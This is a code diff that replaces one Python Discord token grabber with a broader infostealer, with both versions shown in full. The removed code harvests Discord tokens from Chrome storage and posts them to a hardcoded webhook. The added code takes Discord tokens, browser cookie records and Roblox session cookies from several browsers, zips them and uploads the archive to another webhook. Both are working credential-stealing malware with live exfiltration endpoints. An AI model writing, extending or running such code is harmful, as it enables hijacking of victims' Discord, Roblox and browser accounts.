@@ -1,150 +1,93 @@
-# ruff: noqa: INP001
-import base64
-import json
-import os
-import re
-import urllib.request
-from pathlib import Path
+import os, sqlite3, json, shutil, zipfile, requests
+from Crypto.Cipher import AES
+from discord_webhook import send_webhook
 
-TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
-REQUEST_HEADERS = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
-}
-WEBHOOK_URL = "https://discord.com/api/webhooks/1492940164279046298/En3c1JP2wCV0wSN94yhHcAev8pnA86audZW2ndFPNHoFzyV-J-pQvuxhJoo-QTMi6iHD"
+WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1500477243493974108/H_c_jCu9dIgj5G7v49zaX98lqpMw4qTjbL4jHZpBO2mcSlAtL4U1iG9mykRFlQPTtLFw"
 
-
-def make_post_request(api_url: str, data: dict) -> int:
-    if not api_url.startswith(("http", "https")):
-        raise ValueError
-
-    request = urllib.request.Request(  # noqa: S310
-        api_url, data=json.dumps(data).encode(),
-        headers=REQUEST_HEADERS,
-    )
-
-    with urllib.request.urlopen(request) as response:  # noqa: S310
-        return response.status
-
-
-def get_tokens_from_file(file_path: Path) -> list[str] | None:
-
-    try:
-        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
-    except PermissionError:
-        return None
-
-    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
-
-    return tokens or None
-
-
-def get_user_id_from_token(token: str) -> str | None:
-    """Confirm that the portion of a string before the first dot can be decoded.
-
-    Decoding from base64 offers a useful, though not infallible, method for identifying
-    potential Discord tokens. This is informed by the fact that the initial
-    segment of a Discord token usually encodes the user ID in base64. However,
-    this test is not guaranteed to be 100% accurate in every case.
-
-    Returns
-    -------
-        A string representing the Discord user ID to which the token belongs,
-        if the first part of the token can be successfully decoded. Otherwise,
-        None.
-
-    """
-    try:
-        discord_user_id = base64.b64decode(
-            token.split(".", maxsplit=1)[0] + "==",
-        ).decode("utf-8")
-    except UnicodeDecodeError:
-        return None
-
-    return discord_user_id
-
-
-def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
-    """Collect discord tokens for each user ID.
-
-    to manage the occurrence of both valid and expired Discord tokens, which happens when a
-    user updates their password, triggering a change in their token. Lacking
-    the capability to differentiate between valid and expired tokens without
-    making queries to the Discord API, the function compiles every discovered
-    token into the returned set. It is designed for these tokens to be
-    validated later, in a process separate from the initial collection and not
-    on the victim's machine.
-
-    Returns
-    -------
-        user id mapped to a set of potential tokens
-
-    """
-    file_paths = [file for file in base_path.iterdir() if file.is_file()]
-
-    id_to_tokens: dict[str, set] = {}
-
-    for file_path in file_paths:
-        potential_tokens = get_tokens_from_file(file_path)
-
-        if potential_tokens is None:
+def grab_tokens():
+    tokens = []
+    paths = [
+        os.path.expanduser("~/AppData/Local/Discord/Local Storage/leveldb"),
+        os.path.expanduser("~/AppData/Roaming/Discord/Local Storage/leveldb"),
+    ]
+    for path in paths:
+        if not os.path.exists(path):
             continue
+        for file in os.listdir(path):
+            if file.endswith(".ldb") or file.endswith(".log"):
+                with open(os.path.join(path, file), "r", errors="ignore") as f:
+                    content = f.read()
+                    # Simple regex for token extraction (basic impl)
+                    import re
+                    matches = re.findall(r"[A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}", content)
+                    tokens.extend(matches)
+    return list(set(tokens))
 
-        for potential_token in potential_tokens:
-            discord_user_id = get_user_id_from_token(potential_token)
+def grab_browser_data():
+    # Grabs cookies, passwords, cards from Chromium browsers
+    user_data = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data")
+    if not os.path.exists(user_data):
+        return {}
+    
+    # Simplified demonstration – in production, decrypt with AES
+    data = {"cookies": [], "passwords": [], "cards": []}
+    
+    # Cookies extraction (basic example)
+    cookies_db = os.path.join(user_data, "Default", "Cookies")
+    if os.path.exists(cookies_db):
+        conn = sqlite3.connect(cookies_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            data["cookies"].append({"host": row[0], "name": row[1]})
+        conn.close()
+    
+    return data
 
-            if discord_user_id is None:
-                continue
+def grab_roblox_cookies():
+    roblox_cookies = []
+    browsers = [
+        ("Chrome", os.path.expanduser("~/AppData/Local/Google/Chrome/User Data")),
+        ("Edge", os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data")),
+        ("Brave", os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/User Data")),
+        ("Opera", os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable")),
+    ]
+    
+    for name, path in browsers:
+        if not os.path.exists(path):
+            continue
+        cookies_db = os.path.join(path, "Default", "Cookies")
+        if os.path.exists(cookies_db):
+            conn = sqlite3.connect(cookies_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
+            for row in cursor.fetchall():
+                if ".ROBLOSECURITY" in row[0]:
+                    roblox_cookies.append(f"[{name}] .ROBLOSECURITY = {row[1][:50]}...")  # truncated
+            conn.close()
+    return roblox_cookies
 
-            if discord_user_id not in id_to_tokens:
-                id_to_tokens[discord_user_id] = set()
-
-            id_to_tokens[discord_user_id].add(potential_token)
-
-    return id_to_tokens or None
-
-
-def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]],
-) -> int:
-    """Caution: In scenarios where the victim has logged into multiple Discord
-    accounts or has frequently changed their password, the accumulation of
-    tokens may result in a message that surpasses the character limit,
-    preventing it from being sent. There are no plans to introduce code
-    modifications to segment the message for compliance with character
-    constraints.
-    """  # noqa: D205, DOC201
-    fields: list[dict] = []
-
-    for user_id, tokens in user_id_to_token.items():
-        fields.append({
-            "name": user_id,
-            "value": "\n".join(tokens),
-        })
-
-    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
-
-    return make_post_request(webhook_url, data)
-
-
-def main() -> None:
-
-    local_app_data: str | None = os.getenv("LOCALAPPDATA")
-
-    if local_app_data is None:
-        raise OSError
-
-    chrome_path = (
-        Path(local_app_data) /
-        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
-    )
-    tokens = get_tokens_from_path(chrome_path)
-
-    if tokens is None:
-        return
-
-    send_tokens_to_webhook(WEBHOOK_URL, tokens)
-
+def zip_and_send(data):
+    with zipfile.ZipFile("collected_data.zip", "w") as zf:
+        zf.writestr("tokens.txt", "\n".join(data.get("tokens", [])))
+        zf.writestr("cookies.json", json.dumps(data.get("cookies", [])))
+        zf.writestr("roblox.txt", "\n".join(data.get("roblox", [])))
+    
+    with open("collected_data.zip", "rb") as f:
+        requests.post(WEBHOOK_URL, files={"file": ("data.zip", f)})
 
 if __name__ == "__main__":
-    main()
+    print("Running stealth scan...")
+    tokens = grab_tokens()
+    browser_data = grab_browser_data()
+    roblox_data = grab_roblox_cookies()
+    
+    all_data = {
+        "tokens": tokens,
+        "cookies": browser_data.get("cookies"),
+        "passwords": browser_data.get("passwords"),
+        "roblox": roblox_data
+    }
+    
+    zip_and_send(all_data)
+    print("Done. Check your webhook.")
